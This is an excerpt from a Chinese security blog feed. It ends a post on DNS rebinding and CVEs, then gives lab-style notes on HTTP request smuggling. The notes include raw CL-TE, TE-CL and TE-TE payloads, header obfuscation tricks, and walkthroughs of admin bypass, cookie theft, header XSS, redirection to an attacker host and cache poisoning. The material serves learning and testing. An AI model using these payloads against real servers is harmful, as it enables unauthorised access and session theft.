<li>此外，攻击者可以通过发送多个短期IP地址来实现扫描和访问受害者本地网络（192.168.XX）中的所有内部主机。</li>
</ol>
<h2 id="0x05-攻击危害"><a class="markdownIt-Anchor" href="#0x05-攻击危害"></a> 0x05 攻击危害</h2>
<p>DNS Rebinding可以通过让受害者的Web浏览器访问专用IP地址的机器并将结果返回给攻击者来破坏专用网络。 它也可以用于使用受害者机器发送垃圾邮件，分布式拒绝服务攻击（DDOS）或其他恶意活动，也就是我们常听说的肉机和僵尸机。</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88DNS-rebinding/DDOS.png" alt="DDOS"></p>
<h3 id="0x04-1-通过-dns-重新绑定攻击进行网络渗透测试"><a class="markdownIt-Anchor" href="#0x04-1-通过-dns-重新绑定攻击进行网络渗透测试"></a> 0x04-1 通过 DNS 重新绑定攻击进行网络渗透测试：</h3>
<p>在某些情况下，用户会被诱骗使用这些网（例如，私人电子邮件服务器）创建网络钓鱼网站。由于发送到被劫持 URL 的所有流量现在都被发送回原始服务器，因此它变得完全混乱并迫使用户安装网络钓鱼页面。 以此来达到获取用户信息或者是用户权限的作用。</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88DNS-rebinding/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220923151414-1024x576.jpg" alt="网络钓鱼"></p>
<h2 id="0x06-将dns-rebinding应用到实际漏洞挖掘"><a class="markdownIt-Anchor" href="#0x06-将dns-rebinding应用到实际漏洞挖掘"></a> 0x06 将DNS Rebinding应用到实际漏洞挖掘</h2>
<h3 id="cve-2022-4096"><a class="markdownIt-Anchor" href="#cve-2022-4096"></a> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4096">CVE-2022-4096</a></h3>
<blockquote>
<p>漏洞描述：1.8.2 之前的 GitHub 存储库 appsmithorg/appsmith 中的服务器端请求伪造 (SSRF)</p>
<p>复现链接：<a href="https://infosecwriteups.com/ssrf-via-dns-rebinding-cve-2022-4096-b7bf75928bb2">https://infosecwriteups.com/ssrf-via-dns-rebinding-cve-2022-4096-b7bf75928bb2</a></p>
</blockquote>
<h3 id="cve-2023-26492"><a class="markdownIt-Anchor" href="#cve-2023-26492"></a> CVE-2023-26492</h3>
<blockquote>
<p>漏洞描述：Directus 是用于管理 SQL 数据库内容的实时 API 和应用程序仪表板。当从远程 Web 服务器导入文件（POST 到 <code>/files/import</code>）时，Directus 容易受到服务器端请求伪造 (SSRF) 的攻击。攻击者可以通过执行 DNS 重新绑定攻击并查看来自内部服务器的敏感数据或执行本地端口扫描来绕过安全控制。攻击者可以利用此漏洞访问高度敏感的内部服务器并窃取敏感信息。此问题已在版本 9.23.0 中修复。</p>
<p>CVE链接：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26492">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26492</a></p>
</blockquote>
<h3 id="cve-2022-43548"><a class="markdownIt-Anchor" href="#cve-2022-43548"></a> CVE-2022-43548</h3>
<blockquote>
<p>漏洞描述：由于 IsAllowedHost 检查不充分，Node.js 版本 &lt;14.21.1、&lt;16.18.1、&lt;18.12.1、&lt;19.0.1 中存在操作系统命令注入漏洞，该漏洞很容易被绕过，因为 IsIPAddress 没有正确检查 IP在发出允许重新绑定攻击的 DBS 请求之前地址无效。<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32212">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32212</a> 中针对此问题的修复不完整，这个新的 CVE 是为了完成修复。</p>
<p>CVE链接：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548</a></p>
</blockquote>
<p>针对<code>CVE-2022-43548</code>和<code>CVE-2023-26492</code>后续会有完整的复现过程文章，期待一下~</p>
<h2 id="0x07-参考链接"><a class="markdownIt-Anchor" href="#0x07-参考链接"></a> 0x07 参考链接</h2>
<blockquote>
<p>[Web同源策略] <a href="https://zh.wikipedia.org/wiki/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">https://zh.wikipedia.org/wiki/同源策略</a>)</p>
<p>[DNS Rebinding] (<a href="https://en.wikipedia.org/wiki/DNS_rebinding">https://en.wikipedia.org/wiki/DNS_rebinding</a>)</p>
<p>[CVE-2022-4096] (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4096">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4096</a>)</p>
<p>[DNS Rebinding Attacks Explained]  (<a href="https://danielmiessler.com/blog/dns-rebinding-explained/">https://danielmiessler.com/blog/dns-rebinding-explained/</a>)</p>
</blockquote>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>DNS rebinding</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP请求走私</title>
    <url>/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    <content><![CDATA[<p>这是一些关于HTTP请求走私的一些学习笔记和总结，也有一些借鉴，Copy啦！QwQ~<code>====</code></p>
<span id="more"></span>
<h1 id="浅谈http请求走私"><a class="markdownIt-Anchor" href="#浅谈http请求走私"></a> 浅谈HTTP请求走私</h1>
<hr>
<p>​                                                                                                                                                        <strong>--------------TWe1v3</strong></p>
<p>本文主要针对HTTP/1.1协议的请求走私做一些讲解，不涉及HTTP/2.0、HTTP/3.0的相关技术。不过这里可以说一下HTTP和HTTPS的一些差别：</p>
<blockquote>
<p><strong>HTTP与HTTPS不同</strong></p>
<ul>
<li>HTTPS需要CA（Certificate Authority，数字证书认证机构） 申请证书，免费的很少</li>
<li>HTTP默认80端口；HTTPS默认443端口</li>
<li>HTTP使用http标识符；HTTPS使用https标识符</li>
<li>HTTP是明文传输；HTTPS是加密传输</li>
<li>HTTP响应比HTTPS快，因为HTTPS还需要TSL握手，所以HTTPS更耗费服务器资源</li>
</ul>
</blockquote>
<h2 id="产生原因"><a class="markdownIt-Anchor" href="#产生原因"></a> 产生原因</h2>
<p>当今的 Web 应用程序经常在用户和最终应用程序逻辑之间采用 HTTP 服务器链。用户将请求发送到 前端服务器（有时称为负载平衡器或反向代理），此服务器将请求转发到一个或多个后端服务器。 这种类型的架构在现代基于云的应用程序中越来越普遍，在某些情况下是不可避免的。</p>
<p>当前端服务器将 HTTP 请求转发到后端服务器时，它通常会通过同一后端网络发送多个请求 连接，因为这更加高效和高性能。协议非常简单：HTTP请求一个接一个地发送，并且 接收服务器解析 HTTP 请求标头，以确定一个请求的结束位置和下一个请求的开始位置：</p>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126132239777.png" alt="image-20221126132239777"></p>
<p><strong>原因</strong>:当网站使用两个服务器（一个前端，一个后端）来处理用户所提交的数据，而两个服务器之间对HTTP header的处理不一致，就可能产生HTTP走私问题。</p>
<blockquote>
<p>现在的Web应用程序经常在用户和最终的应用程序之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理，也可能是WAF），并且该服务器将请求转发到一个或多个后端服务器。</p>
</blockquote>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126132324467.png" alt="image-20221126132324467"></p>
<h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h2>
<h3 id="http11的特性"><a class="markdownIt-Anchor" href="#http11的特性"></a> HTTP/1.1的特性</h3>
<h4 id="keep-alive"><a class="markdownIt-Anchor" href="#keep-alive"></a> Keep-Alive</h4>
<p>Keep-Alive（又称持久连接），在<code>HTTP/1.1</code>中，默认使用启用Keep-Alive，Keep-Alive功能使客户端到服务器端的连接持续有效，同一对客户/服务器之间的后续请求和响应可以通过这个连接发送。</p>
<h4 id="支持pipeline"><a class="markdownIt-Anchor" href="#支持pipeline"></a> 支持pipeline</h4>
<p><code>HTTP/1.1</code>允许在持久连接上可选地使用请求管道（意味pipeline是依赖于持久连接的，而不是独立的）。pipeline请求管道可以在响应到达之前，将多条请求放入队列，但对于pipeline的请求顺序和响应顺序是相对应的。</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721172714.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721172714-166930312604254.png" alt="img"></a></p>
<h3 id="对于keep-alive模式如何判断请求所得到的响应数据已经接收完成"><a class="markdownIt-Anchor" href="#对于keep-alive模式如何判断请求所得到的响应数据已经接收完成"></a> 对于Keep-Alive模式，如何判断请求所得到的响应数据已经接收完成</h3>
<h4 id="conent-length"><a class="markdownIt-Anchor" href="#conent-length"></a> Conent-Length</h4>
<p>Conent-Length表示实体内容长度，当客户端向服务器请求一个静态页面或者一张图片时，服务器可以很清楚的知道内容大小，然后通过Content-length消息首部字段告诉客户端 需要接收多少数据。</p>
<h4 id="transfer-encoding"><a class="markdownIt-Anchor" href="#transfer-encoding"></a> Transfer-Encoding</h4>
<p>分块编码，数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。</p>
<h3 id="分块编码transfer-encoding-chunked"><a class="markdownIt-Anchor" href="#分块编码transfer-encoding-chunked"></a> 分块编码（Transfer-Encoding: chunked）</h3>
<ol>
<li>在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。</li>
<li>每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF(\r\n)，也不包括分块数据结尾的 CRLF(\r\n)。</li>
<li>最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</li>
</ol>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25\r\n</span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line">1C\r\n</span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line">3\r\n</span><br><span class="line">con\r\n</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
<h2 id="几种走私类型"><a class="markdownIt-Anchor" href="#几种走私类型"></a> 几种走私类型</h2>
<h3 id="cl-te"><a class="markdownIt-Anchor" href="#cl-te"></a> CL-TE</h3>
<p>前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。</p>
<p>发送两次请求，当第二次请求时出现HTTP方式错误，则存在走私问题。实验截图：</p>
<p><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20221126110216153.png" alt="image-20221126110216153"></p>
<p>原因就是第一次前端服务器解析时，使用Content-Length头判断结束，所以传给后端服务器的数据为</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">\r\n</span></span><br><span class="line"><span class="string">\r\n</span></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
<p>总共加起来为6，而后端服务器以 Transfer-Encoding: chunked 判断结束，当遇到</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">\r\n</span></span><br><span class="line"><span class="string">\r\n</span></span><br></pre></td></tr></table></figure>
<p>在分块传输中，则代表结束，而后面的 <code>G</code> ，服务器判断未完成的请求，将遗留在缓存中，所以当第二次请求时，接在了 <code>G</code> 的后面，如下：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">GPOST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host:  <span class="number">0</span>a<span class="number">10004</span><span class="keyword">c</span><span class="number">04</span>fa<span class="number">2400</span><span class="keyword">c</span><span class="number">0</span><span class="keyword">c</span><span class="number">96</span>f<span class="number">4</span>b<span class="number">00440076</span>.web-security-academy.net</span><br><span class="line">Connection: close</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这就完成了一次成功的请求走私<br>
在实际情况中是不会出现HTTP请求方式错误的，可以通过<strong>时间延迟</strong>来判断是否存在CL-TE类型的走私问题：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="number">1</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">A</span></span></span><br><span class="line"><span class="language-css">X</span></span><br></pre></td></tr></table></figure>
<p>如果存在走私问题，下一个请求就会有明显的延迟。</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721193923.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721193923.png" alt="img"></a></p>
<p>或者使用下面的payload进行验证，如果存在走私问题，则会<strong>返回错误</strong>的页面：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foo</span>: x</span></span><br></pre></td></tr></table></figure>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721193726.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721193726.png" alt="img"></a></p>
<ul>
<li>注意<br>
由于前端服务器处理Content-Length，需要把我们所有的内容都发送到后端服务器中去，那这个Content-Length可以用Brupsuite自动计算。</li>
</ul>
<h3 id="te-cl"><a class="markdownIt-Anchor" href="#te-cl"></a> TE-CL</h3>
<p>前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</p>
<p>简单判断payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>时间延迟payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"></span><br><span class="line"><span class="language-tp"><span class="number">0</span></span></span><br><span class="line"><span class="language-tp"></span></span><br><span class="line"><span class="language-tp"><span class="keyword">X</span></span></span><br></pre></td></tr></table></figure>
<p>响应差异payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac361f181f029323806b3eea0007002e.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">34</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">17</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">a</span>=BADHGSGSG</span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意<br>
需要注意的是走私的请求中，Content-Length一定要少于后面请求中的长度，否则后台会Timeout出现错误。</li>
</ul>
<h3 id="te-te"><a class="markdownIt-Anchor" href="#te-te"></a> TE-TE</h3>
<p>前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过以某种方式混淆标头来诱导其中一台服务器不对其进行处理。</p>
<p>混淆的方式：</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Transfer</span>-Encoding: xchunked</span><br><span class="line"></span><br><span class="line"><span class="built_in">Transfer</span>-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="built_in">Transfer</span>-Encoding: chunked</span><br><span class="line"><span class="built_in">Transfer</span>-Encoding: x</span><br><span class="line"></span><br><span class="line"><span class="built_in">Transfer</span>-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]<span class="built_in">Transfer</span>-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]<span class="built_in">Transfer</span>-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="built_in">Transfer</span>-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
<p>简单判断payload</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac261f3a1eb0e24580730eed00d70071.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-encoding</span><span class="punctuation">: </span>cow</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">5c</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GPOST</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">15</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br></pre></td></tr></table></figure>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721203309.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721203309.png" alt="img"></a></p>
<h2 id="利用http请求走私漏洞"><a class="markdownIt-Anchor" href="#利用http请求走私漏洞"></a> 利用HTTP请求走私漏洞</h2>
<h3 id="bypass前端服务器安全验证"><a class="markdownIt-Anchor" href="#bypass前端服务器安全验证"></a> Bypass前端服务器安全验证</h3>
<p><strong>场景</strong>：前端服务器对某些页面添加了访问限制，比如实验中对admin页面控制在只能是后端服务器才能访问，此时可以通过HTTP走私漏洞来绕过这个限制。</p>
<ul>
<li>CL-TE</li>
</ul>
<p>实验地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p>
<p>发送两次请求，响应消息反馈不允许重复header</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721213930.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721213930.png" alt="img"></a></p>
<p>于是，加个传输字符数限制，将走私后面的请求去掉，即可访问/admin界面了</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221139.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221139.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221407.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221407.png" alt="img"></a></p>
<p>完成删除用户</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721221816.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721221816.png" alt="img"></a></p>
<ul>
<li>TE-CL</li>
</ul>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721223313.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721223313.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200721223504.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200721223504.png" alt="img"></a></p>
<h3 id="获取前端服务器对请求的重写情况"><a class="markdownIt-Anchor" href="#获取前端服务器对请求的重写情况"></a> 获取前端服务器对请求的重写情况</h3>
<p><strong>场景</strong>：前端服务器通常在请求添加到其他请求头之前，先对请求进行一些重写，然后再转发给后端服务器。一般是添加一些HTTP HEADER。可以通过HTTP走私请求来获取到这些重写内容。</p>
<p>但走私的前提需具备一些条件：</p>
<ul>
<li>存在一个POST请求，传入参数会储存并可以被查看</li>
<li>存在HTTP走私请求</li>
</ul>
<p>构造一个chunk，包含一个完整的post请求，把可以储存的参数放在最后。当第二个请求传递时，则会把HTTP HEADER添加在参数后面而被存储。就可以获取到前端服务器所添加的HTTP HEADER。这里需要注意Content-Length不能超过所传递数据包的长度，不然会导致请求失败</p>
<p>尝试走私请求直接访问/admin，却返回响应信息只有管理员登陆或者从127.0.0.1请求才可以访问</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724145918.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724145918.png" alt="img"></a></p>
<p>页面上有个搜索框，输入任意内容，会在页面上返回出来</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724150746.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724150746.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724150855.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724150855.png" alt="img"></a></p>
<p>于是利用这个搜索参数，将前端服务器重写请求的情况展示出来，发现了 X-trnzSu-Ip 请求头</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724151412.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724151412.png" alt="img"></a></p>
<p>于是加入走私的请求，再尝试访问/admin发现成功</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724151656.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724151656.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724152230.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724152230.png" alt="img"></a></p>
<h3 id="获取其他用户的cookie"><a class="markdownIt-Anchor" href="#获取其他用户的cookie"></a> 获取其他用户的cookie</h3>
<p>参考上一个实验，这个实验也是通过获取HTTP HEADER来获取其他用户的Cookie。</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164032.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164032.png" alt="img"></a></p>
<h3 id="http-header导致的xss"><a class="markdownIt-Anchor" href="#http-header导致的xss"></a> HTTP header导致的XSS</h3>
<p><strong>场景</strong>：通常情况下，HTTP HEADER导致的XSS是不好利用的，但是通过HTTP走私请求，我们能够控制HTTP HEADER，进而就可以利用这类HTTP头导致的XSS。</p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164602.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164602.png" alt="img"></a></p>
<p><a href="https://raw.githubusercontent.com/Dsysf/images/master/20200724164644.png"><img src="/2022/11/%E6%B5%85%E8%B0%88Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200724164644.png" alt="img"></a></p>
<h3 id="将重定向转变为任意重定向"><a class="markdownIt-Anchor" href="#将重定向转变为任意重定向"></a> 将重定向转变为任意重定向</h3>
<p><strong>场景</strong>：许多应用程序执行现场重定向，并将主机名从请求的Host标头放入重定向URL。</p>
<p>示例：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://normal-website.com/home/</span></span><br></pre></td></tr></table></figure>
<p>通常，此行为被认为是无害的，但是可以在走私请求攻击中利用它来将其他用户重定向到外部域。例如：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="language-vbnet"></span></span><br><span class="line"><span class="language-vbnet"><span class="keyword">GET</span> /home HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="language-vbnet"><span class="symbol">Foo:</span> X</span></span><br></pre></td></tr></table></figure>
<p>走私的请求将触发重定向到攻击者的网站，这将影响后端服务器处理的下一个用户的请求。例如：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker-website.com</span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span></span><br><span class="line"><span class="language-http"><span class="attribute">Location</span><span class="punctuation">: </span>https://attacker-website.com/home/</span></span><br></pre></td></tr></table></figure>
<h3 id="缓存投毒"><a class="markdownIt-Anchor" href="#缓存投毒"></a> 缓存投毒</h3>
<ul>
<li>构造一个页面中写入恶意的内容，比如写入alert(document.cookie)</li>
<li>发送请求走私的内容</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-lab-id.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>129</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: anything</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
<ul>
